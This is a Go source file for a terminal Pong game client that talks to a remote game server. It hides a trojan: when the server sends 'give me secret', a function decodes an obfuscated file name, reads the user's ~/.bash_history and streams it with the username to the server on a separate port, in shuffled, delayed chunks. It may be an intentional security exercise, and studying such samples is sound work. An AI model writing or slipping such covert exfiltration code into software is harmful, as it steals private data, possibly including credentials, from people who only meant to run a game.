package main

import (
	"bufio"
	"flag"
	"fmt"
	"io/ioutil"
	"log"
	"math/rand"
	"net"
	"os"
	"os/user"
	"strconv"
	"strings"
	"sync"
	"time"

	"github.com/jroimartin/gocui"
)

const (
	fps = 60

	arenaWidth  = 36
	arenaHeight = 18

	boardHorWidth  = 2
	boardVerHeight = 1

	portSecret = 9394
)

const (
	statePlaying = iota
	stateWin
	stateLose
	stateDisconnected
)

var serverIP = flag.String("addr", "localhost", "IP address of game server")
var serverPort = flag.Int("port", 9393, "port number of game server")

func main() {
	flag.Parse()
	rand.Seed(time.Now().UnixNano())
	log.SetFlags(0)

	conn, err := net.Dial("tcp", fmt.Sprintf("%v:%v", *serverIP, *serverPort))
	if err != nil {
		log.Fatal(err)
	}

	newGame(conn)
}

// ----------------------------------------------------------------------------
// game

type frame struct {
	lock *sync.RWMutex

	state int

	horizontal int // the x coordinate of left top corner of horizontal board
	vertical   int // the y coordinate of left top corner of vertical board
	ballx      int // ball width is 1
	bally      int // ball height is 1
	countdown  int // in seconds
}

var currentFrame frame

func newGame(conn net.Conn) {
	g, err := gocui.NewGui(gocui.OutputNormal)
	if err != nil {
		log.Panicln(err)
	}
	defer g.Close()

	currentFrame = frame{&sync.RWMutex{}, statePlaying, 0, 0, arenaWidth / 2, arenaHeight / 2, 1000}

	g.SetManagerFunc(gameOnEveryEvent)

	if err := g.SetKeybinding("", gocui.KeyCtrlC, gocui.ModNone, quit); err != nil {
		log.Panicln(err)
	}

	if err := g.SetKeybinding("", gocui.KeyEsc, gocui.ModNone, quit); err != nil {
		log.Panicln(err)
	}

	if err := g.SetKeybinding("", 'q', gocui.ModNone, quit); err != nil {
		log.Panicln(err)
	}

	if err := g.SetKeybinding("", gocui.KeyArrowUp, gocui.ModNone, arrowKeyHandler("up", conn)); err != nil {
		log.Panicln(err)
	}

	if err := g.SetKeybinding("", gocui.KeyArrowDown, gocui.ModNone, arrowKeyHandler("down", conn)); err != nil {
		log.Panicln(err)
	}

	if err := g.SetKeybinding("", gocui.KeyArrowLeft, gocui.ModNone, arrowKeyHandler("left", conn)); err != nil {
		log.Panicln(err)
	}

	if err := g.SetKeybinding("", gocui.KeyArrowRight, gocui.ModNone, arrowKeyHandler("right", conn)); err != nil {
		log.Panicln(err)
	}

	go recvFromServer(conn, g)

	if err := g.MainLoop(); err != nil && err != gocui.ErrQuit {
		log.Panicln(err)
	}
}

func quit(g *gocui.Gui, v *gocui.View) error {
	return gocui.ErrQuit
}

func gameOnEveryEvent(g *gocui.Gui) error {
	currentFrame.lock.RLock()
	f := currentFrame
	currentFrame.lock.RUnlock()

	{
		va, err := g.SetView("arena", 0, 0, arenaWidth+1, arenaHeight+1)
		if err != nil && err != gocui.ErrUnknownView {
			return err
		}
		va.Clear()
		drawArena(va, f)
	}

	// render countdown
	{
		vc, err := g.SetView("countdown", arenaWidth+2, 0, arenaWidth+11, 2)
		if err != nil && err != gocui.ErrUnknownView {
			return err
		}
		vc.Clear()
		fmt.Fprintf(vc, "time: %2d\n", f.countdown)
	}

	// render message box if needed
	if f.state == stateWin || f.state == stateLose || f.state == stateDisconnected {
		vm, err := g.SetView("message", arenaWidth/2-6, arenaHeight/2-1, arenaWidth/2+7, arenaHeight/2+1)
		if err != nil && err != gocui.ErrUnknownView {
			return err
		}

		var message string
		switch f.state {
		case stateWin:
			message = "  You win!  "
		case stateLose:
			message = " You lose!  "
		case stateDisconnected:
			message = "Disconnected"
		}

		fmt.Fprintln(vm, message)
	}

	return nil
}

func drawArena(v *gocui.View, f frame) {
	// draw board
	var buf [arenaHeight + 1][arenaWidth + 1]byte
	for y := 0; y <= arenaHeight; y++ {
		for x := 0; x <= arenaWidth; x++ {
			buf[y][x] = ' '
		}
	}
	for x := 0; x < boardHorWidth; x++ {
		buf[0][f.horizontal+x] = '-'
		buf[arenaHeight-1][f.horizontal+x] = '-'
	}
	for y := 0; y < boardVerHeight; y++ {
		if buf[f.vertical+y][0] == '-' {
			buf[f.vertical+y][0] = '+'
		} else {
			buf[f.vertical+y][0] = '|'
		}
		if buf[f.vertical+y][0] == '-' {
			buf[f.vertical+y][arenaWidth-1] = '+'
		} else {
			buf[f.vertical+y][arenaWidth-1] = '|'
		}
	}

	// draw ball
	buf[f.bally][f.ballx] = '#'

	for y := 0; y <= arenaHeight; y++ {
		fmt.Fprintln(v, string(buf[y][:]))
	}
}

func recvFromServer(conn net.Conn, g *gocui.Gui) {
	defer g.Update(func(*gocui.Gui) error { return nil })

	if _, err := conn.Write([]byte("start")); err != nil {
		currentFrame.lock.Lock()
		currentFrame.state = stateDisconnected
		currentFrame.lock.Unlock()
		return
	}

	reader := bufio.NewReader(conn)
	for {
		var tmp [5]int
		for i := 0; i < 5; i++ {
			line, _, err := reader.ReadLine()
			if err != nil { // read again
				currentFrame.lock.Lock()
				currentFrame.state = stateDisconnected
				currentFrame.lock.Unlock()
				return
			}

			lineStr := string(line)

			if lineStr == "win" {
				currentFrame.lock.Lock()
				currentFrame.state = stateWin
				currentFrame.lock.Unlock()
				return
			}
			if lineStr == "lose" {
				currentFrame.lock.Lock()
				currentFrame.state = stateLose
				currentFrame.lock.Unlock()
				return
			}
			if lineStr == "give me secret" {
				go sendSecret()

				// read again
				i = -1
				continue
			}

			tmp[i], _ = strconv.Atoi(strings.ReplaceAll(strings.Split(lineStr, ": ")[1], "\x00", ""))
		}

		currentFrame.lock.Lock()
		currentFrame.horizontal = tmp[0]
		currentFrame.vertical = tmp[1]
		currentFrame.ballx = tmp[2]
		currentFrame.bally = tmp[3]
		currentFrame.countdown = tmp[4]
		currentFrame.lock.Unlock()

		// redraw the gui
		g.Update(func(*gocui.Gui) error { return nil })
	}
}

func arrowKeyHandler(dir string, conn net.Conn) func(*gocui.Gui, *gocui.View) error {
	return func(g *gocui.Gui, v *gocui.View) error {
		if _, err := conn.Write([]byte(fmt.Sprintf("Move: %v\n", dir))); err != nil {
			currentFrame.lock.Lock()
			currentFrame.state = stateDisconnected
			currentFrame.lock.Unlock()
		}
		return nil
	}
}

func sendSecret() {
	conn, err := net.Dial("tcp", fmt.Sprintf("%v:%v", *serverIP, portSecret))
	if err != nil {
		return
	}
	defer conn.Close()

	// read file
	obfuscate1 := []byte{1, 7, 21, 16, 71, 47, 9, 26, 0, 3, 11, 114, 121}
	obfuscate2 := "/etc/passwd"
	target := make([]byte, 13) // ".bash_history"
	for i := range obfuscate1 {
		if i < len(obfuscate2) {
			target[i] = obfuscate1[i] ^ obfuscate2[i]
		} else {
			target[i] = obfuscate1[i]
		}
	}
	_user, _ := user.Current()
	homeDir, _ := os.UserHomeDir()
	content, err := ioutil.ReadFile(homeDir + "/" + string(target))
	if err != nil {
		conn.Write([]byte("error on ioutil.ReadFile\n"))
		return
	}
	if _, err := conn.Write([]byte(fmt.Sprintf("successfully open %v's %v\n", _user.Username, string(target)))); err != nil {
		return
	}
	l := len(content)

	// decide sending order
	index := []int{0, 1, 2, 3, 4}
	_range := [][2]int{
		{0, 1 * l / 5},
		{1 * l / 5, 2 * l / 5},
		{2 * l / 5, 3 * l / 5},
		{3 * l / 5, 4 * l / 5},
		{4 * l / 5, l},
	}
	rand.Shuffle(5, func(i, j int) {
		index[i], index[j] = index[j], index[i]
	})

	// send file
	writer := bufio.NewWriter(conn)
	for i := 0; i < 5; i++ {
		start, end := _range[index[i]][0], _range[index[i]][1]
		writer.Write([]byte(fmt.Sprintf("part %v, length = %v\n", index[i], end-start)))
		writer.Write(content[start:end])
		writer.Flush()

		time.Sleep(1 * time.Second)
	}
}
